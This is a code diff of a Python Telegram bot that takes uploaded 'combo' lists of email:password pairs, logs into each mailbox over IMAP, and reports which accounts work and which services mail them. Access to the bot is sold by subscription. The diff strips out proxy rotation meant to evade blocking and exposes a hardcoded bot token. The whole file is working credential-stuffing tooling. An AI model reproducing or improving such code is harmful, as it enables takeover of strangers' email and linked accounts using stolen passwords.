@@ -3,10 +3,8 @@ import imaplib
 import logging
 import tempfile
 import time
-import threading
 import random
-import socks
-import socket
+import threading
 from datetime import datetime, timedelta
 from telegram import Update, InputFile
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
@@ -20,10 +18,8 @@ DEFAULT_SERVICES = {
 }
 BOT_TOKEN = "7323939104:AAFMJ9vOVovItz1SIP5NSIH8kaehwdu3sDQ"
 ADMIN_ID = 7155799990
-MAX_THREADS = 5
 DELAY_BETWEEN_ATTEMPTS = 2  # Seconds
 ACCOUNT_TIMEOUT = 20
-PROXY_FILE = "proxy.txt"
 
 CHECK_EMOJI = ["🔍", "🔎", "🕵️", "👀"]
 SUCCESS_EMOJI = ["✅", "🎯", "💰", "🔑"]
@@ -35,37 +31,14 @@ user_subscriptions = {ADMIN_ID: datetime.now() + timedelta(days=365)}
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 logger = logging.getLogger(__name__)
 
-# === HELPER FUNCTIONS ===
-def load_proxies():
-    if not os.path.exists(PROXY_FILE):
-        return []
-    with open(PROXY_FILE, "r") as f:
-        return [line.strip() for line in f if line.strip()]
-
-def save_proxies(proxies):
-    with open(PROXY_FILE, "w") as f:
-        for proxy in proxies:
-            f.write(proxy + "\n")
-
 # === CORE CHECKER CLASS ===
 class AccountChecker:
     def __init__(self):
         self.temp_dir = tempfile.mkdtemp()
         self.lock = threading.Lock()
-        self.active_threads = 0
-        self.proxies = load_proxies()
-        self.proxy_index = 0
 
     def check_auth(self, user_id: int) -> bool:
         return user_id in user_subscriptions and user_subscriptions[user_id] > datetime.now()
-
-    def get_next_proxy(self):
-        with self.lock:
-            if not self.proxies:
-                return None
-            proxy = self.proxies[self.proxy_index % len(self.proxies)]
-            self.proxy_index += 1
-            return proxy
 
     async def send_aesthetic_message(self, update: Update, text: str, success: bool = None):
         emoji = random.choice(
@@ -90,21 +63,6 @@ class AccountChecker:
         context.user_data['combo_file'] = input_path
         await self.send_aesthetic_message(update, "Combo file received! Use /chk to start checking.")
 
-    async def upload_proxy_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if update.effective_user.id != ADMIN_ID:
-            await update.message.reply_text("Admin only command.")
-            return
-
-        doc = update.message.document
-        if not doc or not doc.file_name.endswith('.txt'):
-            await update.message.reply_text("Send a valid proxy .txt file.")
-            return
-
-        file = await doc.get_file()
-        await file.download_to_drive(PROXY_FILE)
-        self.proxies = load_proxies()
-        await update.message.reply_text(f"Loaded {len(self.proxies)} proxies.")
-
     async def check_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         if not self.check_auth(user_id):
@@ -114,10 +72,6 @@ class AccountChecker:
         input_path = context.user_data.get('combo_file')
         if not input_path or not os.path.exists(input_path):
             await self.send_aesthetic_message(update, "No combo file found. Send it first!", False)
-            return
-
-        if not self.proxies:
-            await self.send_aesthetic_message(update, "❌ No working proxies. Use /proxy to upload new list.", False)
             return
 
         output_path = os.path.join(self.temp_dir, f"valid_{user_id}.txt")
@@ -137,10 +91,9 @@ class AccountChecker:
             for i, combo in enumerate(combos, 1):
                 email, password = combo.split(":", 1)
 
-                # Delay to avoid blocking
-                time.sleep(DELAY_BETWEEN_ATTEMPTS)
+                time.sleep(DELAY_BETWEEN_ATTEMPTS)  # Rate limiting for CPU/RAM safety
 
-                result = self.check_account_with_proxy(email.strip(), password.strip())
+                result = self.check_account(email.strip(), password.strip())
                 if result:
                     valid_accounts.append(result)
 
@@ -148,10 +101,6 @@ class AccountChecker:
                 if i % 5 == 0 or i == total:
                     percent = int((i / total) * 100)
                     await progress_msg.edit_text(f"{random.choice(CHECK_EMOJI)} Checked {i}/{total} ({percent}%)")
-
-                if not self.proxies:
-                    await self.send_aesthetic_message(update, "All proxies failed. Use /proxy to upload new ones.", False)
-                    break
 
             with open(output_path, "w") as out:
                 if valid_accounts:
@@ -168,21 +117,12 @@ class AccountChecker:
         finally:
             self.cleanup_files(input_path, output_path)
 
-    def check_account_with_proxy(self, email, password):
-        proxy = self.get_next_proxy()
-        if not proxy:
-            return None
-
-        ip, port = proxy.split(":")
-        port = int(port)
-
-        socks.setdefaultproxy(socks.HTTP, ip, port)
-        socket.socket = socks.socksocket
-
+    def check_account(self, email, password):
         try:
-            imap = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
+            imap = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT, timeout=ACCOUNT_TIMEOUT)
             imap.login(email, password)
             imap.select("INBOX")
+
             services = []
             for service_name, sender in DEFAULT_SERVICES.items():
                 try:
@@ -191,20 +131,14 @@ class AccountChecker:
                         services.append(service_name)
                 except:
                     continue
+
             imap.logout()
-            socket.socket = socket._socketobject  # Reset
 
             if services:
                 return f"{email}:{password} | Services: {', '.join(services)}"
         except Exception as e:
-            logger.debug(f"Proxy failed for {proxy} or login failed for {email}: {e}")
-            with self.lock:
-                if proxy in self.proxies:
-                    self.proxies.remove(proxy)
-                    save_proxies(self.proxies)
+            logger.debug(f"Login failed for {email}: {e}")
             return None
-        finally:
-            socket.socket = socket._socketobject  # Ensure reset
 
     def cleanup_files(self, *paths):
         for path in paths:
@@ -229,7 +163,7 @@ async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Usage: /add <user_id> <days>")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome! Send your combo.txt and use /chk to check. Admins can upload proxies using /proxy.")
+    await update.message.reply_text("Welcome! Send your combo.txt and use /chk to check.")
 
 # === MAIN ===
 def main():
@@ -242,11 +176,6 @@ def main():
     app.add_handler(
         MessageHandler(filters.Document.FileExtension("txt") & filters.ChatType.PRIVATE,
                        checker.handle_file)
-    )
-    app.add_handler(CommandHandler("proxy", checker.upload_proxy_file))
-    app.add_handler(
-        MessageHandler(filters.Document.FileExtension("txt") & filters.Caption.regex(r'/proxy'),
-                       checker.upload_proxy_file)
     )
 
     logger.info("Bot running...")
